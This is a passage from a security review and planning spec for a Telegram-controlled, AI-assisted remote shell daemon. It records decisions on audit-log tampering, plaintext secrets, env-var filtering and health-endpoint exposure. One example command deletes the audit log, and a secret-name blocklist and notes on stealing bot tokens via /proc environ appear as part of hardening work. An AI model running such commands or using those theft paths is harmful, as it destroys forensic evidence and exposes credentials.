12. **OQ12 — Audit log has no tamper protection (🟡 MEDIUM).** "Append-only; no API to delete it remotely" — but `gate run rm /data/audit.log` deletes it via the shell. The audit log is the only forensic evidence of compromise. Recommendations: (a) add `audit.log` path to an internal blocklist so `run_shell()` refuses commands targeting it, (b) optionally support remote syslog (`AUDIT_SYSLOG_HOST`) so a copy exists off-machine, (c) consider HMAC chaining for tamper evidence.

   > **GateCode R1 Decision — DECIDED:** Implement (a) + optional (b); defer (c) to v2. (a) `run_shell()` resolves all path-shaped arguments with `os.path.realpath()` and rejects any command where a resolved argument matches `DATA_DIR/audit.log` or `DATA_DIR/audit.db` — error: `"Command targeting audit files is blocked."` This must be applied *after* OQ9 parsing so it catches `rm`, `/bin/rm`, `bash -c 'rm ...'`, etc. (b) Optional dual-write syslog: `AUDIT_SYSLOG_HOST` / `AUDIT_SYSLOG_PORT` (default `514`) env vars; if set, mirror every audit record to `logging.handlers.SysLogHandler` at startup. The syslog copy is the primary off-machine tamper-evident store. (c) HMAC chaining (append a keyed hash of prev-entry + timestamp + content to each log line): deferred to v2 — requires key management (`AUDIT_HMAC_KEY` env var) and log-rotation complexity. Document the deferral in `security.md`.

13. **OQ13 — First-run wizard writes secrets to disk in plaintext (🟡 MEDIUM).** `wizard.py` creates `.env` with `TG_BOT_TOKEN`, `AI_API_KEY`, etc. File permissions are not specified in the spec. If created with default `umask` (often `022`), the file is world-readable. Must: (a) `os.chmod(path, 0o600)` immediately after creation, (b) warn the user if running as root, (c) for systemd installs, recommend `EnvironmentFile=` with root-owned credential file. *Annotated in Section 2.*

14. **OQ14 — `gate env` filtering mechanism unspecified (🟡 MEDIUM).** The spec says "filtered; never shows secrets" but defines no filtering mechanism. Must define: (a) key-pattern blocklist (`*TOKEN*`, `*KEY*`, `*SECRET*`, `*PASSWORD*`, `*CREDENTIAL*`, `*API*`), (b) apply `SecretRedactor.redact()` to *values* of shown vars, (c) when `key` argument is provided, still apply both filters. *Annotated in Section 6.*

15. **OQ15 — Red Team section missing attack vectors (🟡 LOW).** Section 9 covers the C2 parallel well but omits: (a) bot token theft via `/proc/<pid>/environ`, clipboard sniffing, or backup exposure, (b) Telegram bot API token encoding (contains bot user ID — enables enumeration), (c) `getUpdates` replay if attacker obtains the token (all recent commands visible unless webhook mode), (d) AI prompt injection via attacker-controlled file content read by the AI. *Partially fixed in this review — added to Section 9.*

16. **OQ16 — Health endpoint is unauthenticated information disclosure (🟡 LOW).** Even a minimal `/health` response on a network-visible port confirms the daemon exists — valuable for attackers scanning for remote shell daemons. Recommendations: (a) bind to `127.0.0.1` by default, (b) require `HEALTH_AUTH_TOKEN` header for non-localhost access, (c) return minimal response (just HTTP 200, no version info). *Annotated in Blue Team section.*

---

## 12. Related Art / Prior Work

| Project | URL | Relationship |
|---------|-----|--------------|
| Botgram | https://github.com/nicowillis/botgram | Telegram shell relay, no AI |
| tg-commander | Various | Telegram shell, limited auth |
| TeleRAT | (malware) | Same outbound-C2 pattern, malicious context |
| Mythic C2 | https://github.com/its-a-feature/Mythic | Full C2 framework with similar comms concepts |
| ShellGPT | https://github.com/TheR1D/shell_gpt | AI shell assistant, local only |
| AgentGate | https://github.com/agigante80/AgentGate | **Parent project** (`develop` HEAD `5725a77` — fork source; includes broadcast dispatch, long-response delivery, init command, audit logging, secret redaction, Slack platform, multi-provider git hosting spec) |

---

## 13. Team Review

| Reviewer | Round | Score | Key Findings | Commit |
|----------|-------|-------|--------------|--------|
| GateSec  | R1    | 5/10  | 🔴 `SecretRedactor` missing from portable modules (OQ7). 🔴 `ALLOWED_USERS` optional — must be mandatory for remote shell (OQ8). 🔴 `COMMAND_BLOCKLIST` uses bypassable substring matching (OQ9). 🟡 `gate watch` unbounded (OQ11). 🟡 Audit log self-deletable (OQ12). 🟡 `.env` permissions unspecified (OQ13). 🟡 `gate env` filter undefined (OQ14). 10 OQs added (OQ7–OQ16). | `f4438e4` |
| GateCode | R1    | 6/10  | Decisions recorded on three critical/high items: OQ9 → `shlex.split()` + first-token canonicalization + shell metacharacter detection + recursive shell-interpreter check (rbash rejected). OQ11 → proposed limits adopted with env var overrides (`WATCH_MIN_INTERVAL_SECS=10`, `WATCH_MAX_CONCURRENT=3`, `WATCH_MAX_LIFETIME_SECS=3600`). OQ12 → (a) internal path blocklist + (b) optional syslog dual-write (`AUDIT_SYSLOG_HOST`); HMAC chaining deferred to v2. Estimate increase (18-22h → 25-32h) validated — security hardening on OQ9 alone adds ~3h. Outstanding: OQ10 (`gate cd` sandbox), OQ13–OQ16 implementation details need decisions before coding starts. Score raised from GateSec baseline; still pre-implementation. | TBD |
| GateDocs | R1    | 6/10  | **(1) Spec as AI agent prompt:** Section 2 is strong and actionable. Gaps: no DB schema for new columns (CWD per session, watch registry), no dependency inventory (new packages vs AgentGate baseline), no minimum Python version / OS compatibility statement. **(2) OQ decisions:** OQ9/OQ11/OQ12 decisions are detailed, unambiguous, and immediately implementable — model quality. OQ10 (gate cd sandbox), OQ13 (.env perms decision beyond annotation), OQ14 (gate env filter), OQ16 (health auth) remain open with no decisions; these are implementation-blocking and should be resolved before a coding agent starts. Non-numbered items 1–6 in Section 11 (name, shared-library, multi-machine schema, file transfer, audit format, disclosure) are also open design decisions — consolidate them as OQ1–OQ6 or close them explicitly. **(3) Estimate gaps:** `gate watch stop [id]` subcommand (from OQ11 decision), `ALLOWED_USERS` mandatory startup enforcement (OQ8), CI/CD workflow setup and PyPI publish pipeline are absent from the table — estimate understates effort by ~3-5h. **(4) Missing sections:** No testing strategy (only 1 row in estimate — what gets tested, what test types, coverage targets?). No licensing section (MIT? GPL? Critical given dual-use nature). No versioning/release plan (semver, PyPI cadence). No migration/coexistence notes for existing AgentGate users. **(5) Section 9 as security.md seed:** Usable but incomplete — needs: explicit threat model summary (assets, actors, assumptions), trust boundary description, token revocation procedure beyond one-line BotFather note, incident response checklist, and cross-references to OQ10 (gate cd → /etc/shadow path) and OQ11 (gate watch exfiltration loop) as attack surfaces currently absent from the section. HMAC chaining deferral (OQ12) should be a documented known gap. | `9b75c14` |
| GateCode | R2    | 7/10  | Reviewed per user request (2026-03-15). **(1) Fork source updated:** v0.7.3 → `develop` HEAD `5725a77` — ensures all portable modules (`AuditLog` ABC, `SecretRedactor`, streaming throttle, multi-agent delegation) are current. The agent prompt (Section 2) updated accordingly. **(2) Names:** Re-verified all candidates with `pip install --dry-run` (previous `pip index versions` check was unreliable — returns non-standard errors for non-existent packages). All original "✅ Available" candidates confirmed available. New AI variants added: `remoteaigate` ✅, `airemotegate` ✅, `remotegateai` ✅. Red team / malware-associated names explicitly ruled out with rationale. **(3) Recommendation changed:** `remoteaigate` (project name **RemoteAIGate**) replaces ShellRelay/ShellPilot as primary recommendation — preserves brand family, adds AI signal, no offensive connotation. `remotegate` as clean fallback. **(4) Platform compatibility:** New Section 3a added — v1 is Linux + macOS native + Docker everywhere (amd64/arm64). Windows requires Docker/WSL; native Windows support deferred to v2 due to `pexpect`, shell command differences, and `chmod 0600` limitations. Raspberry Pi (arm64/armv7) explicitly supported. **(5) Learning purpose:** Prominent educational purpose statement added to header, footer, and Section 9. **(6) Section 9 (Red/Blue):** Educational disclaimer block added at top — clearly frames the dual-use analysis as learning, not operational guidance. | *current* |

---

*Document generated: 2026-03-10. Security review: 2026-03-14. GateCode R1 review (fork source, naming, platform compatibility): 2026-03-15. This is a planning document, not production code. All security analysis is provided for educational and defensive awareness purposes. This project is created for learning reasons — to understand the capabilities and limits of AI and possible integrations with operating system environments.*
